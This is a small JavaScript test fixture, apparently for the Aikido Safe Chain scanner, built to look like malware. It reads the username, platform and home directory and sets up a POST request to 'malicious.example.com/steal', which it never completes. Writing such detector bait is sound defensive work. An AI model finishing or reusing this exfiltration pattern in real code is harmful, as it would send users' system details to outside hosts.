// WARNING: This file is intentionally crafted to appear suspicious for testing Aikido Safe Chain.
// It does NOT perform any malicious actions.

const fs = require('fs');
const os = require('os');
const http = require('http');

// Suspicious-looking code (harmless)
const suspiciousData = {
  user: os.userInfo().username,
  platform: os.platform(),
  homeDir: os.homedir(),
};

// Pretend to send data to a remote server (but does not actually send anything)
function fakeExfiltrate(data) {
  // Looks like exfiltration, but is a no-op
  http.request({ hostname: 'malicious.example.com', path: '/steal', method: 'POST' }, () => {});
  return 'Pretending to exfiltrate: ' + JSON.stringify(data);
}

console.log(fakeExfiltrate(suspiciousData)); 